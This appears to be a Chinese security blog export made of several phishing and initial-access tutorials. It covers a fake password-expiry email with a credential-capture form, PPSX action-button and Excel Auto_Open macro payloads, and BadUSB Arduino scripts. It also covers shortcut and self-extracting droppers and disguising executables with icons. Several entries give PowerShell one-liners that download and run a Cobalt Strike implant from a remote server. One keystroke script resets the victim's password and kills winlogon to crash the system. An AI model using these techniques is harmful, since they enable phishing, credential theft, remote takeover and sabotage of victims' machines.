<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">   &lt;input name=&quot;username&quot; type=&quot;text&quot; placeholder=&quot;username&quot;/&gt;</span><br><span class="line">   &lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;password&quot;/&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt;</span><br><span class="line">&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="Email-Templates配置"><a href="#Email-Templates配置" class="headerlink" title="Email Templates配置"></a>Email Templates配置</h5><p><img src="/images/1666076598872-fcdb7a4e-4a43-411d-86d2-9abedb6020df.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html data-csescriptallow=&quot;true&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;您好：&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;近期检测到您在学者网教学科研协作单位平台的密码已过期， 请点击&lt;a href=&quot;&#123;&#123;.URL&#125;&#125;&quot;&gt;此链接&lt;/a&gt;尽快修改密码，谢谢配合！&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;请不要直接回复本邮件。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;学信网&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>其他配置和上述介绍类似</p>
<h5 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h5><p><img src="/images/1666077029012-aab4c393-fd9c-44c0-9c75-e2819d9b0d55.png"></p>
<h5 id="点击链接"><a href="#点击链接" class="headerlink" title="点击链接"></a>点击链接</h5><p>输入用户名密码后提交会跳转到学信网首页</p>
<p><img src="/images/1666077573405-31eae495-4fc6-453e-b366-90f566220485.png"></p>
<h5 id="后台查看输入数据"><a href="#后台查看输入数据" class="headerlink" title="后台查看输入数据"></a>后台查看输入数据</h5><p><img src="/images/1666077130046-980104fe-15a4-47b0-a492-1ac188c27526.png"></p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>PPT动作按钮特性构造PPSX钓鱼</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/PPT%E5%8A%A8%E4%BD%9C%E6%8C%89%E9%92%AE%E7%89%B9%E6%80%A7%E6%9E%84%E9%80%A0PPSX%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[<p><img src="/images/1665304303218-ef69de94-1746-431c-8a9d-ff7f16229031.png"></p>
<p><img src="/images/1665305130335-538ccd82-f42b-4f1c-b9c2-2a7fb80997da.png"></p>
<h5 id="插入–-gt-形状–-gt-工作按钮"><a href="#插入–-gt-形状–-gt-工作按钮" class="headerlink" title="插入–&gt;形状–&gt;工作按钮"></a>插入–&gt;形状–&gt;工作按钮</h5><p><img src="/images/1665304639254-4aa15653-b4fc-4a83-8116-a26f995d6f99.png"></p>
<h5 id="设置运行程序"><a href="#设置运行程序" class="headerlink" title="设置运行程序"></a>设置运行程序</h5><p><img src="/images/1665307255297-ce6c0fb3-d612-42d9-b39d-0071b65b6da7.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>

<h5 id="然后重命名为-ppsx后缀"><a href="#然后重命名为-ppsx后缀" class="headerlink" title="然后重命名为.ppsx后缀"></a>然后重命名为.ppsx后缀</h5><p>注意，如果是用cmd.exe &#x2F;c执行命令，这里不要选择另存为，否则不会执行后续的命令参数</p>
<p>如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665307356374-b673f326-a96d-4f18-a2a6-0bed861fc4e1.png"></p>
<h5 id="双击打开文件，点击按钮即上线"><a href="#双击打开文件，点击按钮即上线" class="headerlink" title="双击打开文件，点击按钮即上线"></a>双击打开文件，点击按钮即上线</h5><p><img src="/images/1665307383696-0f018531-0e2f-4c7f-9a5f-ffe9001c0c95.png"></p>
<p>该利用方式同时适用于wps</p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>badusb初探</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/badusb%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>这里以最像u盘的leonardo_Arduino为badusb载体</p>
<h2 id="第一步：Arduino安装"><a href="#第一步：Arduino安装" class="headerlink" title="第一步：Arduino安装"></a>第一步：Arduino安装</h2><p>下载Arduino开发者工具——用来向leonardo烧录程序的软件。</p>
<p><a href="https://www.arduino.cn/thread-5838-1-1.html">https://www.arduino.cn/thread-5838-1-1.html</a></p>
<p>官网：<a href="https://www.arduino.cc/en/software">https://www.arduino.cc/en/software</a></p>
<p>直接装就完事</p>
<p><img src="/images/1662387479142-79620737-c97b-4e79-9090-c1e96b50d8bc.png"></p>
<h5 id="更改中文"><a href="#更改中文" class="headerlink" title="更改中文"></a>更改中文</h5><p><img src="/images/2022-11-21-15-29-08-image.png"></p>
<p><img src="/images/2022-11-21-15-29-31-image.png"></p>
<h2 id="第二步：Arduino"><a href="#第二步：Arduino" class="headerlink" title="第二步：Arduino"></a>第二步：Arduino</h2><p>工具-开发板-开发板管理器</p>
<p><img src="/images/1662388486461-4517cc69-4590-4cd6-8daf-2b8b2b8447ef.png"></p>
<p>回到主界面</p>
<h5 id="开发板选择"><a href="#开发板选择" class="headerlink" title="开发板选择"></a>开发板选择</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工具-开发板- Arduino Leonardo</span><br></pre></td></tr></table></figure>

<p><img src="/images/1662388595312-822eba26-bb49-4ed6-be68-4518c6e3a0bc.png"></p>
<h5 id="编程器选择"><a href="#编程器选择" class="headerlink" title="编程器选择"></a>编程器选择</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AVRISP mkII</span><br></pre></td></tr></table></figure>

<p><img src="/images/1662388708998-b4aa4a4f-cb07-4d68-915e-79be114dd11e.png"></p>
<p><img src="/images/2022-11-21-15-32-16-image.png"></p>
<h5 id="Automator"><a href="#Automator" class="headerlink" title="Automator"></a>Automator</h5><p>有个快速编写命令的工具：Automator</p>
<p>下载地址：<a href="https://github.com/Catboy96/Automator">GitHub - Catboy96&#x2F;Automator: ⌨ Digispark™ Rubber Ducky code editor for Windows.</a></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>插上你的leonardo，点击左上角第二个箭头符号进行上传，等待个50几秒就成功了。</p>
<p><img src="/images/1662389418313-ed825f05-2807-4772-acaa-90b036d64af3.png"></p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果没有自动选择需要手动选择自己的设备</p>
<p><img src="/images/2022-11-21-15-47-18-image.png"></p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;//初始化</span><br><span class="line">  Keyboard.begin();//开始键盘通讯</span><br><span class="line">  Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.press(&#x27;r&#x27;);//r键</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">  Keyboard.release(&#x27;r&#x27;);</span><br><span class="line">  Keyboard.println(&quot;cmd.exe&quot;);</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.println(&quot;calc&quot;);</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.end();//结束键盘通讯CMD</span><br><span class="line">&#125;</span><br><span class="line">void loop()//循环</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="powershell上线CS"><a href="#powershell上线CS" class="headerlink" title="powershell上线CS"></a>powershell上线CS</h2><p>首先生成一个cs powershell的上线马</p>
<p><img src="/images/2022-11-21-15-38-10-image.png"></p>
<p>将下述代码载入设备</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;//初始化</span><br><span class="line">  Keyboard.begin();//开始键盘通讯</span><br><span class="line">  delay(5000);</span><br><span class="line">  Keyboard.press(KEY_LEFT_GUI);//win键，按下</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.press(&#x27;r&#x27;);//r键，按下</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.release(KEY_LEFT_GUI);//释放win</span><br><span class="line">  Keyboard.release(&#x27;r&#x27;);//释放r</span><br><span class="line">  Keyboard.println(&quot;cmd.exe&quot;);</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.println(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12224/a&#x27;))\&quot;&quot;);</span><br><span class="line">  delay(200);</span><br><span class="line">  Keyboard.end();//结束键盘通讯CMD</span><br><span class="line">&#125;</span><br><span class="line">void loop()//循环</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="有关程序覆盖问题"><a href="#有关程序覆盖问题" class="headerlink" title="有关程序覆盖问题"></a>有关程序覆盖问题</h2><p>每次上传都会刷新</p>
<p>擦除+刷写+校验。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12229/a&#x27;))\&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Arduino-Leonardo教程"><a href="#Arduino-Leonardo教程" class="headerlink" title="Arduino Leonardo教程"></a>Arduino Leonardo教程</h2><h5 id="和键盘有关的常用函数指引"><a href="#和键盘有关的常用函数指引" class="headerlink" title="和键盘有关的常用函数指引"></a><strong>和键盘有关的常用函数指引</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///首先是头文件</span><br><span class="line">#include &quot;Keyboard.h&quot;    </span><br><span class="line"></span><br><span class="line">///声明头文件后，就可以使用常用的函数，初始化键盘，这个我会放在setup()函数里面</span><br><span class="line">Keyboard.begin();</span><br><span class="line"></span><br><span class="line">///然后可以试着打印一段字符</span><br><span class="line">Keyboard.print(&quot;GG&quot;);//没有回车</span><br><span class="line">Keyboard.println(&#x27;\r&#x27;);//有回车</span><br><span class="line"></span><br><span class="line">///一些必要的函数，按下按键和释放按键</span><br><span class="line">Keyboard.press(KEY_BACKSPACE);</span><br><span class="line">Keyboard.release(KEY_BACKSPACE);</span><br></pre></td></tr></table></figure>

<h5 id="特殊按键使用"><a href="#特殊按键使用" class="headerlink" title="特殊按键使用"></a>特殊按键使用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///Alt和Ctrl和Shift</span><br><span class="line">#define KEY_LEFT_CTRL   0x80</span><br><span class="line">#define KEY_LEFT_SHIFT    0x81</span><br><span class="line">#define KEY_LEFT_ALT    0x82</span><br><span class="line">#define KEY_LEFT_GUI    0x83</span><br><span class="line">#define KEY_RIGHT_CTRL    0x84</span><br><span class="line">#define KEY_RIGHT_SHIFT   0x85</span><br><span class="line">#define KEY_RIGHT_ALT   0x86</span><br><span class="line">#define KEY_RIGHT_GUI   0x87</span><br><span class="line">///方向键系列</span><br><span class="line">#define KEY_UP_ARROW    0xDA</span><br><span class="line">#define KEY_DOWN_ARROW    0xD9</span><br><span class="line">#define KEY_LEFT_ARROW    0xD8</span><br><span class="line">#define KEY_RIGHT_ARROW   0xD7</span><br><span class="line">//特殊键位，其中RETURN就是回车</span><br><span class="line">#define KEY_BACKSPACE   0xB2</span><br><span class="line">#define KEY_TAB       0xB3</span><br><span class="line">#define KEY_RETURN      0xB0</span><br><span class="line">#define KEY_ESC       0xB1</span><br><span class="line">///特殊键位，我比较常用的是DELETE</span><br><span class="line">#define KEY_INSERT      0xD1</span><br><span class="line">#define KEY_DELETE      0xD4</span><br><span class="line">#define KEY_PAGE_UP     0xD3</span><br><span class="line">#define KEY_PAGE_DOWN   0xD6</span><br><span class="line">#define KEY_HOME      0xD2</span><br><span class="line">#define KEY_END       0xD5</span><br><span class="line">#define KEY_CAPS_LOCK   0xC1</span><br><span class="line">///F区的这些那些</span><br><span class="line">#define KEY_F1        0xC2</span><br><span class="line">#define KEY_F2        0xC3</span><br><span class="line">#define KEY_F3        0xC4</span><br><span class="line">#define KEY_F4        0xC5</span><br><span class="line">#define KEY_F5        0xC6</span><br><span class="line">#define KEY_F6        0xC7</span><br><span class="line">#define KEY_F7        0xC8</span><br><span class="line">#define KEY_F8        0xC9</span><br><span class="line">#define KEY_F9        0xCA</span><br><span class="line">#define KEY_F10       0xCB</span><br><span class="line">#define KEY_F11       0xCC</span><br><span class="line">#define KEY_F12       0xCD</span><br><span class="line">#define KEY_F13       0xF0</span><br><span class="line">#define KEY_F14       0xF1</span><br><span class="line">#define KEY_F15       0xF2</span><br><span class="line">#define KEY_F16       0xF3</span><br><span class="line">#define KEY_F17       0xF4</span><br><span class="line">#define KEY_F18       0xF5</span><br><span class="line">#define KEY_F19       0xF6</span><br><span class="line">#define KEY_F20       0xF7</span><br><span class="line">#define KEY_F21       0xF8</span><br><span class="line">#define KEY_F22       0xF9</span><br><span class="line">#define KEY_F23       0xFA</span><br><span class="line">#define KEY_F24       0xFB</span><br></pre></td></tr></table></figure>

<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;//初始化</span><br><span class="line">Keyboard.begin();//开始键盘通讯</span><br><span class="line">delay(5000);//延时</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题</span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK); //释放大写键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.press(&#x27;r&#x27;);//r键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.release(&#x27;r&#x27;);</span><br><span class="line">Keyboard.println(&quot;cmd.exe&quot;);</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;CMD.EXE /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&amp;NET USER %USERNAME% HACKED&quot;);//修改密码HACKED</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color a&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ........................................................ &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ### ###### ## ## ######## ######## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 0&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 1&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 2&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ######### ## ## ## ##### ###### ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 3&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ######### ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 4&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ## ## ## ## ## ## ## ## ## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 5&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ## ## ## ## ###### ## ## ######## ######## &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color 6&quot;);//更改命令行颜色（绿色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;echo ........................................................ &gt;&gt; hacked.txt&quot;);//向hacked.txt写内容</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;color c&quot;);//更改命令行颜色（红色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;cls&quot;);//更改命令行颜色（红色）</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;type hacked.txt&quot;);//将hacked.txt文件内容打印在cmd</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;CMD /C START /MIN CMD /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&amp;CMD /C START /MIN CMD /C NTSD -C Q -PN WINLOGON.EXE 1&gt;NUL 2&gt;NUL&amp;TASKKILL /F /IM WININIT.EXE 2&gt;NUL&quot;);//蓝屏XP、7</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.println(&quot;taskkill /f /im explorer.exe&quot;);//删除桌面进程(all)</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.end();//结束键盘通讯</span><br><span class="line">&#125;</span><br><span class="line">void loop()//循环</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="命令行颜色相关"><a href="#命令行颜色相关" class="headerlink" title="命令行颜色相关"></a>命令行颜色相关</h5><p><img src="/images/1662389741911-16d24671-1089-4391-8d80-37748a3c7d8f.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>excel钓鱼(office)</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/excel%E9%92%93%E9%B1%BC(office)/</url>
    <content><![CDATA[<h2 id="sheet右键插入"><a href="#sheet右键插入" class="headerlink" title="sheet右键插入"></a>sheet右键插入</h2><p><img src="/images/1665296484752-07145a2a-baec-47ef-ae19-78111d962d71.png"></p>
<h2 id="选择宏表"><a href="#选择宏表" class="headerlink" title="选择宏表"></a>选择宏表</h2><p><img src="/images/1665296533204-07b5885a-e1a5-4d0c-99a5-905378375f41.png"></p>
<p>会多出一栏宏</p>
<p><img src="/images/1665296578713-88797dcc-316d-4eb1-9cdd-b3c75a89ccb9.png"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>分别在A1和A2输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=exec(&quot;c:\windows\system32\cmd.exe&quot;)</span><br><span class="line">=halt()</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665296646193-cdded01b-6d69-4ba5-ad9e-42875fe1c19c.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">并将A1改为Auto_Open</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665296823093-4782b636-fc03-4270-8bc7-9ebd052cb943.png"></p>
<h5 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h5><p>可能会报如下错误</p>
<p><img src="/images/1665297307090-b503ddfe-6d8e-486f-982d-24798e81a2df.png"></p>
<h5 id="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"><a href="#单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件" class="headerlink" title="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"></a>单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件</h5><p><img src="/images/1665297404810-b7af1740-237e-4371-b314-27ae5e4a5b7e.png"></p>
<h5 id="成功执行系统命令"><a href="#成功执行系统命令" class="headerlink" title="成功执行系统命令"></a>成功执行系统命令</h5><p><img src="/images/1665297687638-e8787e4b-3a56-4594-8007-e6ec0e6723ab.png"></p>
<h5 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h5><p>可以右键将其隐藏</p>
<p><img src="/images/1665298061106-30f698ba-0e2f-4d9c-b5cc-e994062fe3b0.png"></p>
<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>将系统命令替换为CS上线脚本即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://114.55.173.106:12888/a&#x27;))</span><br></pre></td></tr></table></figure>

<p>这里由于excel中公式对单双引号的解析问题，直接贴上去无法执行</p>
<h5 id="生成exe马"><a href="#生成exe马" class="headerlink" title="生成exe马"></a>生成exe马</h5><p><img src="/images/1665303573348-87529184-2027-4f7a-8c70-ac53c45d5db8.png"></p>
<p><img src="/images/1665303670194-7cfad13b-5cc5-4c9b-8126-23d0417eae75.png"></p>
<h5 id="打开文档即上线"><a href="#打开文档即上线" class="headerlink" title="打开文档即上线"></a>打开文档即上线</h5><p><img src="/images/1665303691884-961166e4-dc60-498f-a834-0b8873a8a097.png"></p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>exe伪装(更换图标)</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/exe%E4%BC%AA%E8%A3%85(%E6%9B%B4%E6%8D%A2%E5%9B%BE%E6%A0%87)/</url>
    <content><![CDATA[<p>首先需要知道的是，快捷方式是可以通过右键属性更改图标的，而exe不行</p>
<h2 id="制作ico"><a href="#制作ico" class="headerlink" title="制作ico"></a>制作ico</h2><p>在线网站</p>
<p><a href="https://www.bitbug.net/">https://www.bitbug.net/</a></p>
<h2 id="快捷方式更换ico"><a href="#快捷方式更换ico" class="headerlink" title="快捷方式更换ico"></a>快捷方式更换ico</h2><p>快捷方式优点就是方便，缺点就是只能ico必须在指定目录，否则就无了</p>
<h5 id="右键属性"><a href="#右键属性" class="headerlink" title="右键属性"></a>右键属性</h5><p><img src="/images/1665320522065-1422452f-5d49-4d80-928d-46319d04988d.png"></p>
<h5 id="可以选择系统中的图标"><a href="#可以选择系统中的图标" class="headerlink" title="可以选择系统中的图标"></a>可以选择系统中的图标</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\System32\SHELL32.dll</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665320683988-a232a406-5cf9-496d-9b58-de4efe8451fd.png"></p>
<h5 id="也可以使用自己的图标"><a href="#也可以使用自己的图标" class="headerlink" title="也可以使用自己的图标"></a>也可以使用自己的图标</h5><p><img src="/images/1665320664924-791e30e4-0557-4893-8377-c19c79627ac8.png"></p>
<p><img src="/images/1665320717759-5e6c63d2-2ae0-4ad2-91b2-b14e96253a81.png"></p>
<h5 id="exe更改图标"><a href="#exe更改图标" class="headerlink" title="exe更改图标"></a>exe更改图标</h5><p>exe并不能通过右键属性更改图标</p>
<p>这里需要借助其他工具</p>
<h2 id="resource-hacker"><a href="#resource-hacker" class="headerlink" title="resource_hacker"></a>resource_hacker</h2><p>缺点为只能为本来就存在图标的exe更换图标</p>
<h5 id="如图"><a href="#如图" class="headerlink" title="如图"></a>如图</h5><p><img src="/images/1665324741918-6de777c4-84ae-4ad8-a5b6-366fe2b41eea.png"></p>
<p><img src="/images/1665324804951-d5b206fd-2aad-48dd-80e7-19f5c5eb0cad.png"></p>
<p><img src="/images/1665325306073-d6550a39-c531-47a9-a9d7-1944c80e0abb.png"></p>
<h5 id="还可以使用其他exe的图标，直接选择exe就行"><a href="#还可以使用其他exe的图标，直接选择exe就行" class="headerlink" title="还可以使用其他exe的图标，直接选择exe就行"></a>还可以使用其他exe的图标，直接选择exe就行</h5><p><img src="/images/1665325386986-ccfd9dc2-b4db-4567-b21f-83252240aff4.png"></p>
<h5 id="成功替换"><a href="#成功替换" class="headerlink" title="成功替换"></a>成功替换</h5><p>建议在保存的时候选择另存为，存到其他路径，好像是有缓存，可以重启或直接放到其他主机或目录</p>
<p><img src="/images/1665325757284-8a24e229-02ef-44c3-85ac-ff2b93ad9e75.png"></p>
<h2 id="QIcon"><a href="#QIcon" class="headerlink" title="QIcon"></a>QIcon</h2><p><img src="/images/1665325612042-34c924ec-7182-4bd8-91fc-a173c5607fe2.png"></p>
<h5 id="拖入点apply即可"><a href="#拖入点apply即可" class="headerlink" title="拖入点apply即可"></a>拖入点apply即可</h5><p><img src="/images/1665326051647-51888795-9b82-4673-8529-a68f954b9781.png"></p>
<p>可用于更改自解压钓鱼exe的图标</p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>postfix查看日志</title>
    <url>/2023/05/11/%E7%A4%BE%E5%B7%A5/postfix%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">journalctl -u postfix.service</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230323160437589.png" alt="image-20230323160437589"></p>
<p><img src="/images/image-20230323160449799.png" alt="image-20230323160449799"></p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>powershell快捷方式钓鱼</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/powershell%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p>和Link链接钓鱼类似</p>
<h2 id="创建快捷方式"><a href="#创建快捷方式" class="headerlink" title="创建快捷方式"></a>创建快捷方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12888/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>由于不需要调用其他文件，起始位置为空就行</p>
<p><img src="/images/1665284276884-34396d69-4a97-4ff7-bc81-b8ffec3560ab.png"></p>
<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>双击即上线</p>
<p><img src="/images/1665284355445-6a77551a-0703-4ea6-bb36-e532c6b91daa.png"></p>
<h2 id="更改快捷方式图标"><a href="#更改快捷方式图标" class="headerlink" title="更改快捷方式图标"></a>更改快捷方式图标</h2><p>将其更改为python的图标</p>
<p><img src="/images/1665284566707-3f2a8b68-c382-43a6-8eb5-02bf162cc01d.png"></p>
<p><img src="/images/1665284666346-c55d3bc4-cb01-47e1-8b32-a5cf2cc5ede9.png"></p>
<p><img src="/images/1665284606595-63a5222b-3c54-4a41-a58d-694ab167a1b7.png"></p>
<p>同样双击即上线</p>
<p><img src="/images/1665303934572-30220743-0688-478c-9395-1de47a0e41ed.png"></p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>rar解压自运行(自解压钓鱼)</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/rar%E8%A7%A3%E5%8E%8B%E8%87%AA%E8%BF%90%E8%A1%8C(%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC)/</url>
    <content><![CDATA[<h5 id="恶意程序准备"><a href="#恶意程序准备" class="headerlink" title="恶意程序准备"></a>恶意程序准备</h5><p>生成CS exe马，可以再准备一个calc.exe用于迷惑</p>
<p><img src="/images/1665316648984-69e3a37d-c554-4e51-9ef2-39a93fd86958.png"></p>
<h5 id="使用winrar，选中”创建自解压格式压缩文件”"><a href="#使用winrar，选中”创建自解压格式压缩文件”" class="headerlink" title="使用winrar，选中”创建自解压格式压缩文件”"></a>使用winrar，选中”创建自解压格式压缩文件”</h5><p><img src="/images/1665316829001-9f96854b-93f5-40c5-bff1-4e69e17bb41d.png"></p>
<p>文件名会自己变为exe后缀</p>
<h5 id="高级–-gt-设置"><a href="#高级–-gt-设置" class="headerlink" title="高级–&gt;设置"></a>高级–&gt;设置</h5><p><img src="/images/1665316988167-723aed2d-1fc7-4a86-90b8-3f5cc36901a6.png"></p>
<h5 id="高级–-gt-模式"><a href="#高级–-gt-模式" class="headerlink" title="高级–&gt;模式"></a>高级–&gt;模式</h5><p><img src="/images/1665317056284-a38b3d51-cdeb-49e9-8ca5-3088a767dd7b.png"></p>
